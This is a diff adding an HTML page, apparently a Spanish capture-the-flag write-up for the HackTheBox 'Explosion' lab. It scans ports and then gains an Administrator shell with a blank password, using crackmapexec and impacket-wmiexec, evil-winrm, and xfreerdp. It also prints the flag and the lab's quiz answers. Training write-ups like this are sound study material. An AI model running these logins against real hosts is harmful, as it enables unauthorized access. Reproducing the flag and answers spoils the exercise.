@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Explosion HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/explosion.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Explosion HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Explosion de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Explosion de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Explosion HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Explosion HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Explosion de la plataforma de HackTheBox","headline":"Writeup Explosion HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Explosion HackTheBox</h1>
+          <p>Resolución de la máquina Explosion de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.18.73
+Nmap scan report for 10.129.18.73
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman</span>
+</code></pre></div></div>
+
+<br><div><strong><h3>Forma 1</h3></strong></div><br>
+
+<div><p>Ya que esta el puerto 445 abierto podemos ver si el usuario Administrator nos permite conectarnos sin contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">smb 10.129.18.73 -u Administrator -p </span><span class="no">''
+</span><span class="na">SMB</span><span class="p">         10.129.18.73   445    EXPLOSION        </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:EXPLOSION) (domain:Explosion) (signing:False) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         10.129.18.73   445    EXPLOSION        </span><span class="s2">[+]</span><span class="p"> Explosion\Administrator: </span><span class="no">(Pwn3d!)</span>
+</code></pre></div></div>
+
+<div><p>Nos dice (Pwned!), podemos conectarnos con psexec o en mi caso prefiero wmiexec y leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-wmiexec </span><span class="p">WORKGROUP/Administrator@10.129.18.73 -no-pass
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\> </span><span class="no">whoami</span><span class="p">
+explosion\administrator
+
+C:\> </span><span class="no">type </span><span class="p">C:\Users\Administrator\Desktop\flag.txt
+951fa96d7830c451b536be5a6be008a0
+
+C:\></span>
+</code></pre></div></div>
+
+<br><div><strong><h3>Forma 2</h3></strong></div><br>
+
+<div><p>Vemos el 5985 abierto asi que podemos probar conectarnos sin contraseña pero con evil-winrm</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ evil-winrm </span><span class="p">-i 10.129.18.73 -u Administrator -p </span><span class="no">''</span><span class="p">
+PS C:\Users\Administrator\Documents> </span><span class="no">whoami</span><span class="p">
+explosion\administrator
+PS C:\Users\Administrator\Documents> </span><span class="no">type</span><span class="p"> ..\Desktop\flag.txt
+951fa96d7830c451b536be5a6be008a0
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div>
+
+<br><div><strong><h3>Forma 3</h3></strong></div><br>
+
+<div><p>Por ultimo podemos ver el 3389 que es rdp asi que podemos probar autenticarnos sin contraseña, lo unico usaremos /cert:ignore para evitar errores de certificado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ xfreerdp </span><span class="p">/v:10.129.18.73 /cert:ignore /u:Administrator /p:
+[20:52:43:713] [254364:254371] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
+[20:52:43:713] [254364:254371] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
+[20:52:43:713] [254364:254371] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
+[20:52:43:713] [254364:254371] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
+[20:52:43:725] [254364:254371] [INFO][com.freerdp.client.x11] - Property 373 does not exist
+[20:52:44:067] [254364:254371] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
+[20:52:44:088] [254364:254371] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
+[20:52:44:088] [254364:254371] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
+[20:52:47:187] [254364:254371] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[20:52:47:187] [254364:254371] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_RGB16
+[20:52:47:255] [254364:254371] [INFO][com.winpr.clipboard] - initialized POSIX local file subsystem
+[20:52:47:312] [254364:254371] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[20:52:48:175] [254364:254371] [INFO][com.freerdp.core] - rdp_set_error_info:freerdp_set_last_error_ex resetting error state</span>
+</code></pre></div></div>
+
+<div><p>Al conectarnos nos lanza una ventana grafica donde podemos interactual con el servidor con los privilegios del usuario Administrator</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Cerramos lo que tenemos abierto y abrimos la flag</p></div>
+<a href="./2.png" target="_blank"><div><p><img src="./2.png"><p></div></a>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>What does the 3-letter acronym RDP stand for?</strong></li>
+<ul><p></p><li>Remote Desktop Protocol</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is a 3-letter acronym that refers to interaction with the host through a command line interface?</strong></li>
+<ul><p></p><li>CLI</li></ul></blockquote><br>
+
+<blockquote><li><strong>What about graphical user interface interactions?</strong></li>
+<ul><p></p><li>GUI</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23?</strong></li>
+<ul><p></p><li>telnet</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of the service running on port 3389 TCP?</strong></li>
+<ul><p></p><li>ms-wbt-server</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the switch used to specify the target host's IP address when using xfreerdp?</strong></li>
+<ul><p></p><li>/v:</li></ul></blockquote><br>
+
+<blockquote><li><strong>What username successfully returns a desktop projection to us with a blank password?</strong></li>
+<ul><p></p><li>Administrator</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>951fa96d7830c451b536be5a6be008a0</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
